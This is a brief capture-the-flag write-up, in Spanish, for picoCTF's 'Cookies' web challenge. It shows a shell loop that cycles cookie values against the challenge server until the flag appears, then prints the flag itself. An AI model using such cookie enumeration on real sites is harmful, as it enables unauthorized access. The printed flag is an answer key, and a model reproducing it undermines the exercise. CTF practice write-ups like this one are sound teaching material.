#### Description

Who doesn't love cookies? Try to figure out the best one. http://wily-courier.picoctf.net:52989/

**Solución**

```

Fercho@MSI:/mnt/c/Users/ferga$ for i in {0..20}; do c -s http://wily-courier.picoctf.net:52989/check -H "Cookie: name=$i"; done | grep picoCTF
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}

```

**Notas adicionales**

- Curl es una herramienta de línea de comandos de Linux que sirve para transferir datos hacia o desde un servidor con URL, utilizando cualquiera de los protocolos soportados.

Referencias

- https://www.hostgator.mx/blog/comando-curl-linux/